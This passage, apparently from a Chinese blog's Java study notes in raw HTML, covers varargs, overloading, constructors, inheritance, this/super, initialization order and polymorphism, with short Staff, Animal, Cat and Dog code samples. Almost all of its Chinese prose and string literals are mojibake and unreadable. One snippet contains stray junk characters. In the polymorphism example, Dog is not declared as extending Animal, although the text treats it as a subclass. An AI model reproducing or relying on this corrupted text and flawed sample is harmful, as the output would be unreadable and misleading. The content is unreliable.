title="å¯å˜å½¢å‚"></a>å¯å˜å½¢å‚</h2><p>å‚æ•°çš„ä¸ªæ•°å¯ä»¥æ˜¯ä»»æ„ä¸ª 0~n</p><p>å¦‚ä½•å£°æ˜ï¼Ÿ</p><pre><code class="java">public static void sum(int...a)&#123;&#125;  //ä¸‰ä¸ªç‚¹</code></pre><p>å¯å˜å½¢å‚é‡‡ç”¨æ•°ç»„å­˜å‚¨å®å‚</p><pre><code class="java">xxxxxxxxxxÂ public static void sum(double a , int...a)&#123;&#125; </code></pre><p>ä¸èƒ½å­˜åœ¨ä¸¤ä¸ªå¯å˜å‚æ•°ï¼Œä¸”å¯å˜å‚æ•°å¿…é¡»åœ¨æœ€å</p><h2 id="æ–¹æ³•é‡è½½"><a href="#æ–¹æ³•é‡è½½" class="headerlink" title="æ–¹æ³•é‡è½½"></a>æ–¹æ³•é‡è½½</h2><p>ä¸åŒçš„æ–¹æ³•å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•å</p><p>è¦æ±‚ï¼šåŒä¸€ç±»ä¸­ï¼ŒåŒä¸€æ–¹æ³•åï¼Œä¸åŒçš„å½¢å‚åˆ—è¡¨ï¼šæ•°é‡ã€é¡ºåºã€ç±»å‹</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302000931131.png" alt="image-20220302000931131"></p><p>æ–¹æ³•è°ƒç”¨æ—¶ä¼šæ ¹æ®ä¸åŒçš„æ•°æ®ç±»å‹æ‰¾åˆ°æœ€ä½³åŒ¹é…çš„æ–¹æ³•</p><h2 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h2><p>idea</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003110469.png" alt="image-20220302003110469"></p><p>å‘½ä»¤è¡Œ</p><pre><code class="java">class Sakura&#123;    public static void main(String [] args)&#123;        for(String ele:args)&#123;            System.out.println(ele);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003703283.png" alt="image-20220302003703283"></p><h2 id="é™æ€å¯¼å…¥"><a href="#é™æ€å¯¼å…¥" class="headerlink" title="é™æ€å¯¼å…¥"></a>é™æ€å¯¼å…¥</h2><p>å¯¼å…¥ä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰é™æ€èµ„æº</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302004244597.png" alt="image-20220302004244597"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003831636.png" alt="image-20220302003831636"></p><h2 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302225312848.png" alt="image-20220302225312848"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302235022144.png" alt="image-20220302235022144"></p><h2 id="å¯¹è±¡ç±»å‹æ•°ç»„"><a href="#å¯¹è±¡ç±»å‹æ•°ç»„" class="headerlink" title="å¯¹è±¡ç±»å‹æ•°ç»„"></a>å¯¹è±¡ç±»å‹æ•°ç»„</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303001402384.png" alt="image-20220303001402384"></p><h2 id="å°è£…çš„æ¦‚å¿µåŠå››ä¸ªæƒé™ä¿®é¥°ç¬¦çš„æ¦‚å¿µ"><a href="#å°è£…çš„æ¦‚å¿µåŠå››ä¸ªæƒé™ä¿®é¥°ç¬¦çš„æ¦‚å¿µ" class="headerlink" title="å°è£…çš„æ¦‚å¿µåŠå››ä¸ªæƒé™ä¿®é¥°ç¬¦çš„æ¦‚å¿µ"></a>å°è£…çš„æ¦‚å¿µåŠå››ä¸ªæƒé™ä¿®é¥°ç¬¦çš„æ¦‚å¿µ</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303215651821.png" alt="image-20220303215651821"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303215810126.png" alt="image-20220303215810126"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303220134500.png" alt="image-20220303220134500"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303220910747.png" alt="image-20220303220910747"></p><h2 id="å±æ€§çš„ç®€å•å°è£…"><a href="#å±æ€§çš„ç®€å•å°è£…" class="headerlink" title="å±æ€§çš„ç®€å•å°è£…"></a>å±æ€§çš„ç®€å•å°è£…</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303221632106.png" alt="image-20220303221632106"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303221931211.png" alt="image-20220303221931211"></p><h1 id="day9é¢å‘å¯¹è±¡"><a href="#day9é¢å‘å¯¹è±¡" class="headerlink" title="day9é¢å‘å¯¹è±¡"></a>day9é¢å‘å¯¹è±¡</h1><h2 id="æ„é€ å™¨"><a href="#æ„é€ å™¨" class="headerlink" title="æ„é€ å™¨"></a>æ„é€ å™¨</h2><p>å¯ä»¥å¿«é€Ÿç»™æˆå‘˜å˜é‡èµ‹å€¼</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231205347.png" alt="image-20220303231205347"></p><p>åˆ›å»ºç±»</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231339865.png" alt="image-20220303231339865"></p><p>æ„é€ </p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231528049.png" alt="image-20220303231528049"></p><p>æ¯ä¸€ä¸ªç±»éƒ½ä¼šæœ‰ä¸€ä¸ªæ— å‚æ„é€ å™¨ï¼Œä½†æ˜¯å½“å£°æ˜æœ‰å‚æ„é€ å™¨åï¼Œé»˜è®¤æ— å‚æ„é€ å™¨å°±ä¼šæ¶ˆå¤±ï¼Œè¿™æ—¶å€™å¦‚æœå†å†™</p><pre><code class="java">Student s = new Student();</code></pre><p>å°±ä¼šæŠ¥é”™ã€‚æ‰€ä»¥å»ºè®®è‡ªå®šä¹‰ç±»éƒ½å†æä¾›ä¸€ä¸ªæ— å‚æ„é€ å™¨ã€‚</p><p>ä½¿ç”¨æ„é€ å™¨åˆ›å»ºå¯¹è±¡</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303232035228.png" alt="image-20220303232035228"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303233229581.png" alt="image-20220303233229581"></p><h2 id="å¯¹å±æ€§çš„å°è£…"><a href="#å¯¹å±æ€§çš„å°è£…" class="headerlink" title="å¯¹å±æ€§çš„å°è£…"></a>å¯¹å±æ€§çš„å°è£…</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304004650481.png" alt="image-20220304004650481"></p><p>è¦å¯¹ç”¨æˆ·çš„ä¿¡æ¯è¿›è¡Œæ ¡éªŒ</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304005044933.png" alt="image-20220304005044933"></p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304005720701.png" alt="image-20220304005720701"></p><pre><code class="java">//Staff.javapackage com.sakura.staff;public class Staff &#123;    private int num;    private char sex;    private double salary;    private String name;    public Staff(int a, String b, char c, double d)&#123;        this.num = a;        this.name = b;        this.sex = c;        this.salary = d;    &#125;    public Staff()&#123;&#125;    void setinfo(int a,String b,char c,double d)&#123;        this.num = a;        this.name = b;        this.sex = c;        this.salary = d;    &#125;    void getinfo()&#123;        System.out.println(&quot;num = &quot; + num);        System.out.println(&quot;name = &quot; + name);        System.out.println(&quot;sex = &quot; + sex);        System.out.println(&quot;salary = &quot; + salary);    &#125;&#125;</code></pre><pre><code class="java">//Test.javapackage com.sakura.staff;public class Test &#123;    public static void main(String[] args) &#123;        Staff num1 = new Staff();        num1.setinfo(123,&quot;sakura&quot;,&#39;ç”·&#39;,20000);        num1.getinfo();        Staff num2 = new Staff(666,&quot;Alice&quot;,&#39;å¥³&#39;,10000);        num2.getinfo();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304012001796.png" alt="image-20220304012001796"></p><h2 id="æ ‡å‡†javabean"><a href="#æ ‡å‡†javabean" class="headerlink" title="æ ‡å‡†javabean"></a>æ ‡å‡†javabean</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093001246.png" alt="image-20220304093001246"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093017092.png" alt="image-20220304093017092"></p><h2 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093913672.png" alt="image-20220304093913672"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304094152414.png" alt="image-20220304094152414"></p><p>1ã€ä½¿ç”¨ç»§æ‰¿è¦å€Ÿç”¨å…³é”®å­—extends</p><p>2ã€è¯­æ³•ç»“æ„</p><pre><code class="java">[æƒé™ä¿®é¥°ç¬¦] å­ç±» extends çˆ¶ç±»&#123;&#125;</code></pre><p>3ã€å½“å­ç±»ç»§æ‰¿çˆ¶ç±»åå°±å¯ä»¥ä½¿ç”¨çˆ¶ç±»çš„èµ„æº</p><p>èŒƒä¾‹:</p><p>çˆ¶ç±»:</p><pre><code class="java">package com.sakura.jicheng;public class Animal &#123;    private String name;    private int age;    void setname(String name)&#123;        this.name = name;    &#125;    void setAge(int age)&#123;        this.age = age;    &#125;    void eat()&#123;        System.out.println(this.name+&quot;æ­£åœ¨åƒé¥­&quot;);    &#125;    int getinfo_age()&#123;        return this.age;    &#125;    String getinfo_name()&#123;        return this.name;    &#125;&#125;</code></pre><p>Catç±»</p><pre><code class="java">package com.sakura.jicheng;public class Cat extends Animal&#123;    void miao()&#123;        System.out.println(&quot;miao~miao~miao~&quot;);    &#125;&#125;</code></pre><p>Dogç±»</p><pre><code class="java">package com.sakura.jicheng;public class Dog extends Animal&#123;    void wang()&#123;        System.out.println(&quot;wang wang wang&quot;);    &#125;&#125;</code></pre><p>Testç±»</p><pre><code class="java">package com.sakura.jicheng;public class Test &#123;    public static void main(String[] args) &#123;        Cat cat = new Cat();        cat.setAge(8);        cat.setname(&quot;å’ªå’ª&quot;);        System.out.println(cat.getinfo_age());        System.out.println(cat.getinfo_name());        cat.miao();        Dog dog = new Dog();        dog.setAge(10);        dog.setname(&quot;å¤§ç™½&quot;);        System.out.println(dog.getinfo_age());        System.out.println(dog.getinfo_name());        dog.wang();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304130800705.png" alt="image-20220304130800705"></p><h2 id="å½“å‡ºç°åŒåå˜é‡æ—¶ï¼šthisä¸super"><a href="#å½“å‡ºç°åŒåå˜é‡æ—¶ï¼šthisä¸super" class="headerlink" title="å½“å‡ºç°åŒåå˜é‡æ—¶ï¼šthisä¸super"></a>å½“å‡ºç°åŒåå˜é‡æ—¶ï¼šthisä¸super</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304131840347.png" alt="image-20220304131840347"></p><p>superä»£è¡¨ä»çˆ¶ç±»ç»§æ‰¿ä¸‹æ¥çš„èµ„æº</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304132237877.png" alt="image-20220304132237877"></p><h2 id="ç»§æ‰¿èµ„æºçš„æŸ¥æ‰¾"><a href="#ç»§æ‰¿èµ„æºçš„æŸ¥æ‰¾" class="headerlink" title="ç»§æ‰¿èµ„æºçš„æŸ¥æ‰¾"></a>ç»§æ‰¿èµ„æºçš„æŸ¥æ‰¾</h2><p>çˆ¶ç±»çš„æ–¹æ³•ä¸èƒ½æ»¡è¶³å­ç±»éœ€æ±‚æ—¶ï¼Œè¦è¿›è¡Œæ–¹æ³•é‡å†™</p><p>å­ç±»åœ¨ä½¿ç”¨èµ„æºæ—¶ï¼Œä¼˜å…ˆåœ¨æœ¬ç±»ä¸­æŸ¥æ‰¾ï¼Œå½“æœ¬ç±»ä¸­æ²¡æœ‰æ—¶ï¼Œæ‰å»çˆ¶ç±»ä¸­æŸ¥æ‰¾ï¼Œä¸€ç‚¹ä¸€ç‚¹å‘ä¸Šæ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°objectç±»</p><p>objectç±»æ˜¯æ‰€æœ‰ç±»çš„çˆ¶ç±»</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304145340962.png" alt="image-20220304145340962"></p><h2 id="æ–¹æ³•çš„é‡å†™"><a href="#æ–¹æ³•çš„é‡å†™" class="headerlink" title="æ–¹æ³•çš„é‡å†™"></a>æ–¹æ³•çš„é‡å†™</h2><p>1ã€å½“å­ç±»é‡å†™çˆ¶ç±»çš„æ–¹æ³•æ—¶ï¼Œè®¿é—®æƒé™ä¸èƒ½æ¯”çˆ¶ç±»çš„è®¿é—®æƒé™æ›´åŠ ä¸¥æ ¼ï¼Œè¦&gt;=çˆ¶ç±»çš„è®¿é—®æƒé™</p><p>2ã€è¿”å›å€¼ç±»å‹</p><p>å½“çˆ¶ç±»çš„è¿”å›ç±»å‹æ˜¯åŸºæœ¬æ•°æ®ç±»å‹æ—¶ï¼Œåˆ™å­ç±»å¿…é¡»ä¸çˆ¶ç±»ä¿æŒä¸€è‡´</p><p>å½“çˆ¶ç±»çš„è¿”å›ç±»å‹æ˜¯å¼•ç”¨æ•°æ®ç±»å‹æ—¶ï¼Œåˆ™å­ç±»å¯ä»¥æ˜¯è¿”å›çˆ¶ç±»ï¼Œä¹Ÿå¯ä»¥æ˜¯è¿”å›å­ç±»</p><p>3ã€æ–¹æ³•é‡å†™æ—¶ï¼Œå­ç±»çš„å½¢å‚å¿…é¡»ä¸çˆ¶ç±»çš„å½¢å‚ä¿æŒä¸€è‡´ï¼Œå¦åˆ™å°±ç›¸å½“äºåœ¨å­ç±»ä¸­æ–°å¢ä¸€ä¸ªæ–¹æ³•</p><p>4ã€å­ç±»ä¸èƒ½æŠ›å‡ºæ¯”çˆ¶ç±»æ›´å¤§çš„å¼‚å¸¸</p><h2 id="thisè¯¦è§£"><a href="#thisè¯¦è§£" class="headerlink" title="thisè¯¦è§£"></a>thisè¯¦è§£</h2><p>thiså¯ä»¥åŒºåˆ†å±€éƒ¨å˜é‡å’Œæˆå‘˜å˜é‡</p><p>thiså¯ä»¥è°ƒç”¨æœ¬ç±»ä¸­çš„æ„é€ å™¨(æ˜¯æ ¹æ®æ•°æ®ç±»å‹æ¥åŒ¹é…çš„ï¼Œè€Œä¸æ˜¯å½¢å‚å)</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304152113902.png" alt="image-20220304152113902"></p><p>è°ƒç”¨å¦ä¸€ä¸ªæ„é€ å™¨æ—¶ï¼Œthiså¿…é¡»æ”¾åœ¨æœ¬æ„é€ å™¨é¦–è¡Œï¼Œå¦‚æœ¬ä¾‹ä¸­</p><pre><code class="java">this(name,age,salary);</code></pre><p>å°±åœ¨é¦–è¡Œ</p><p>ä¸€èˆ¬éƒ½æ˜¯å¤šå‚è°ƒå°‘å‚ã€‚åœ¨æœ¬ç±»ä¸­ï¼Œthiså¯çœç•¥</p><h2 id="superè¯¦è°ˆ"><a href="#superè¯¦è°ˆ" class="headerlink" title="superè¯¦è°ˆ"></a>superè¯¦è°ˆ</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304153656976.png" alt="image-20220304153656976"></p><p>æ¯ä¸€ä¸ªæ„é€ å™¨é¦–è¡Œéƒ½ä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„éšè—çš„superï¼Œè°ƒç”¨çˆ¶ç±»æ— å‚çš„æ„é€ å™¨</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304154053753.png" alt="image-20220304154053753"></p><p>å½“è¿™ç§æƒ…å†µçš„æ—¶å€™ï¼Œsuperæ˜¯åœ¨å°‘å‚çš„æ„é€ å™¨ä¸­,ç¬¬äºŒä¸ªå‚æ•°æ„é€ å™¨çš„super()è‡ªåŠ¨æ¶ˆå¤±äº†</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304155540813.png" alt="image-20220304155540813"></p><p>å¯ä»¥ä½¿ç”¨super()è°ƒç”¨çˆ¶ç±»æœ‰å‚çš„æ„é€ å™¨</p><p>å¯ä»¥ä½¿ç”¨super.è°ƒç”¨çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•</p><h2 id="æˆå‘˜å˜é‡çš„èµ‹å€¼æ–¹æ³•"><a href="#æˆå‘˜å˜é‡çš„èµ‹å€¼æ–¹æ³•" class="headerlink" title="æˆå‘˜å˜é‡çš„èµ‹å€¼æ–¹æ³•"></a>æˆå‘˜å˜é‡çš„èµ‹å€¼æ–¹æ³•</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160521490.png" alt="image-20220304160521490"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160500362.png" alt="image-20220304160500362"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160942707.png" alt="image-20220304160942707"></p><p>ä»£ç å—ç”¨ {}åŒ…è£¹</p><p>å½“æ˜¯è¿™ç§é™æ€ä»£ç å—æ—¶ï¼Œä»£ç å—åªæ‰§è¡Œä¸€æ¬¡</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160839692.png" alt="image-20220304160839692"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160744120.png" alt="image-20220304160744120"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160752027.png" alt="image-20220304160752027"></p><p>é™æ€ä»£ç å—:ç”¨äºç»™é™æ€å˜é‡è¿›è¡Œèµ‹å€¼</p><p>é™æ€ä»£ç åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå†æ¬¡åˆ›å»ºnä¸ªå¯¹è±¡ä¹Ÿä¸ä¼šæ‰§è¡Œã€‚ä¹Ÿæ˜¯å…ˆäºæ„é€ å™¨æ‰§è¡Œ</p><p>ç»™æˆå‘˜å˜é‡èµ‹å€¼æ–¹å¼:</p><p>1.<strong>é»˜è®¤å€¼</strong></p><p>2.<strong>ç›´æ¥èµ‹å€¼</strong></p><p>3.<strong>ä»£ç å—èµ‹å€¼</strong></p><p>4.<strong>get/setèµ‹å€¼</strong></p><p>5ã€<strong>æ„é€ å™¨èµ‹å€¼</strong></p><p>é™æ€å˜é‡ä¸å»ºè®®é‡‡ç”¨ä½¿ç”¨æ„é€ å™¨èµ‹å€¼ï¼Œå› ä¸ºå®ƒæ˜¯å±äºç±»çš„ï¼Œå¯ä»¥ç›´æ¥ ç±»å.å±æ€§è¿›è¡Œèµ‹å€¼</p><h1 id="day10-é¢å‘å¯¹è±¡"><a href="#day10-é¢å‘å¯¹è±¡" class="headerlink" title="day10 é¢å‘å¯¹è±¡"></a>day10 é¢å‘å¯¹è±¡</h1><h2 id="ç±»çš„åˆå§‹åŒ–"><a href="#ç±»çš„åˆå§‹åŒ–" class="headerlink" title="ç±»çš„åˆå§‹åŒ–"></a>ç±»çš„åˆå§‹åŒ–</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306000154596.png" alt="image-20220306000154596"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306001804012.png" alt="image-20220306001804012"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306002346773.png" alt="image-20220306002346773"></p><p>å½“æœ‰å­ç±»çš„åˆå§‹åŒ–æ—¶ï¼Œä¼šå…ˆå¯¹çˆ¶ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œå†åˆå§‹åŒ–å­ç±»</p><h2 id="ç±»çš„åˆå§‹åŒ–ä¸å«å­ç±»"><a href="#ç±»çš„åˆå§‹åŒ–ä¸å«å­ç±»" class="headerlink" title="ç±»çš„åˆå§‹åŒ–ä¸å«å­ç±»"></a>ç±»çš„åˆå§‹åŒ–ä¸å«å­ç±»</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306010601437.png" alt="image-20220306010601437"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306010614896.png" alt="image-20220306010614896"></p><h2 id="å®ä¾‹åˆå§‹åŒ–ä¸å«å­ç±»"><a href="#å®ä¾‹åˆå§‹åŒ–ä¸å«å­ç±»" class="headerlink" title="å®ä¾‹åˆå§‹åŒ–ä¸å«å­ç±»"></a>å®ä¾‹åˆå§‹åŒ–ä¸å«å­ç±»</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306011526112.png" alt="image-20220306011526112"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306011757666.png" alt="image-20220306011757666"></p><p>æ¯æ¬¡è°ƒç”¨æ„é€ å™¨ï¼Œéƒ½ä¼šé‡å¤æ‰§è¡Œä¸€æ¬¡initæ–¹æ³•</p><h2 id="ç±»çš„åˆå§‹åŒ–å«å­ç±»"><a href="#ç±»çš„åˆå§‹åŒ–å«å­ç±»" class="headerlink" title="ç±»çš„åˆå§‹åŒ–å«å­ç±»"></a>ç±»çš„åˆå§‹åŒ–å«å­ç±»</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306012632684.png" alt="image-20220306012632684"></p><h2 id="æ··åˆåˆå§‹åŒ–"><a href="#æ··åˆåˆå§‹åŒ–" class="headerlink" title="æ··åˆåˆå§‹åŒ–"></a>æ··åˆåˆå§‹åŒ–</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306013247338.png" alt="image-20220306013247338"></p><h2 id="å¤šæ€çš„åˆè¯†"><a href="#å¤šæ€çš„åˆè¯†" class="headerlink" title="å¤šæ€çš„åˆè¯†"></a>å¤šæ€çš„åˆè¯†</h2><p>å°è£…ï¼šéšè—å†…éƒ¨çš„å®ä¹ ç»†èŠ‚ï¼Œåªå¯¹å¤–æš´éœ²å°‘é‡æ¥å£ï¼Œä¾›å¤–ç•Œè®¿é—®</p><p>æ–¹æ³•ï¼šå¯¹åŠŸèƒ½çš„å°è£…</p><p>ç±»ï¼šå¯¹æ–¹æ³•çš„å°è£…</p><p>åŒ…ï¼šå¯¹æ¨¡å—çš„å°è£…</p><hr><p>ç»§æ‰¿ï¼šå®ç°èµ„æºçš„å¤ç”¨</p><p>â€‹              æ–¹æ³•å±æ€§</p><hr><p>å¤šæ€ï¼šä¸€ä¸ªå¯¹è±¡çš„å¤šç§å½¢æ€</p><p>ä½œç”¨ï¼šå¯ä»¥è®©ä»£ç æ›´åŠ çµæ´»</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110018629.png" alt="image-20220306110018629"></p><p>å¤šæ€æœ‰ä¸¤ç§çŠ¶æ€(å·¦è¾¹ç¼–è¯‘æ—¶çŠ¶æ€ = å³è¾¹è¿è¡Œæ—¶çŠ¶æ€)ï¼š</p><p>1ã€ç¼–è¯‘æ—¶çŠ¶æ€</p><p>2ã€è¿è¡Œæ—¶çŠ¶æ€</p><p>å¤šæ€åˆ›å»ºçš„å¯¹è±¡èƒ½å¤Ÿè°ƒç”¨ä»€ä¹ˆæ–¹æ³•è¦çœ‹ç¼–è¯‘æ—¶çŠ¶æ€</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110650725.png" alt="image-20220306110650725"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110802347.png" alt="image-20220306110802347"></p><p>ç¤ºä¾‹ä»£ç :</p><p>Animalç±»</p><pre><code class="java">package com.sakura.duotai;public class Animal &#123;    void eat()&#123;        System.out.println(&quot;åƒé¥­å•¦~~&quot;);    &#125;&#125;</code></pre><p>Catç±»</p><pre><code class="java">package com.sakura.duotai;public class Cat extends Animal&#123;    void eat()&#123;        System.out.println(&quot;çŒ«åƒé±¼&quot;);    &#125;    void catchMouse()&#123;        System.out.println(&quot;çŒ«æŠ“è€é¼ &quot;);    &#125;&#125;</code></pre><p>Dogç±»</p><pre><code class="java">package com.sakura.duotai;public class Dog &#123;    void eat()&#123;        System.out.println(&quot;ç‹—åƒéª¨å¤´&quot;);    &#125;    void lookHome()&#123;        System.out.println(&quot;ç‹—çœ‹å®¶&quot;);    &#125;&#125;</code></pre><p>å½“æˆ‘ä»¬ç”¨Animalç±»å»newä¸€ä¸ªå­ç±»å¯¹è±¡æ—¶ï¼Œå°±æ˜¯å¤šæ€çš„ä¸€ç§ä½“ç°</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113022606.png" alt="image-20220306113022606"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113038273.png" alt="image-20220306113038273"></p><p>å¦‚å›¾ï¼Œè¾“å‡ºçš„æ˜¯çŒ«é‡å†™çš„eatæ–¹æ³•</p><p>ä½†å½“æˆ‘ä»¬å°è¯•è°ƒç”¨catä¸­å…¶å®ƒæ–¹æ³•æ—¶ï¼Œå°±ä¼šæŠ¥é”™</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113233339.png" alt="image-20220306113233339"></p><pre><code class="java">Animal a = new Cat();/**è¿™é‡Œçš„Animal a å°±æ˜¯ç¼–è¯‘æ—¶çŠ¶æ€ new cat(); æ˜¯è¿è¡Œæ—¶çŠ¶æ€å¤šæ€åˆ›å»ºçš„å¯¹è±¡èƒ½å¤Ÿè°ƒç”¨ä»€ä¹ˆæ–¹æ³•è¦çœ‹ç¼–è¯‘æ—¶çŠ¶æ€,ä»£ç è·‘èµ·æ¥æ—¶å¯¹è±¡æ˜¯è°ï¼Œè¦çœ‹è¿è¡Œæ—¶çŠ¶æ€**/</code></pre><h2 id="å¤šæ€çš„ä½œç”¨ä¸€èŠ‚çœä»£ç é‡"><a href="#å¤šæ€çš„ä½œç”¨ä¸€èŠ‚çœä»£ç é‡" class="headerlink" title="å¤šæ€çš„ä½œç”¨ä¸€èŠ‚çœä»£ç é‡"></a>å¤šæ€çš„ä½œç”¨ä¸€èŠ‚çœä»£ç é‡</h2><pre><code class="java">package com.sakura.duotai1;public class Programmer &#123;    void eat()&#123;        System.out.println(&quot;ç¨‹åºå‘˜ å¹²é¥­&quot;);    &#125;&#125;class Chinese extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;ä¸­å›½äººä½¿ç”¨ç­·å­åƒé¥­&quot;);    &#125;    void act()&#123;        System.out.println(&quot;ä¸­å›½äººä¼šåŠŸå¤«&quot;);    &#125;&#125;class India extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;å°åº¦äººä½¿ç”¨æ‰‹åƒé¥­&quot;);    &#125;    void act()&#123;        System.out.println(&quot;å°åº¦äººæ‘©æ‰˜è½¦ç©çš„è´¼6&quot;);    &#125;&#125;class European extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;æ¬§æ´²äººä½¿ç”¨åˆ€å‰åƒé¥­&quot;);    &#125;    void act()&#123;        System.out.println(&quot;æ¬§æ´²äººå–œæ¬¢æé™è¿åŠ¨&quot;);    &#125;&#125;</code></pre><pre><code class="java">package com.sakura.duotai1;public class Test &#123;    public static void main(String[] args) &#123;        Chinese chinese = new Chinese();        India india = new India();        European european = new European();        showEat(chinese);        showEat(india);     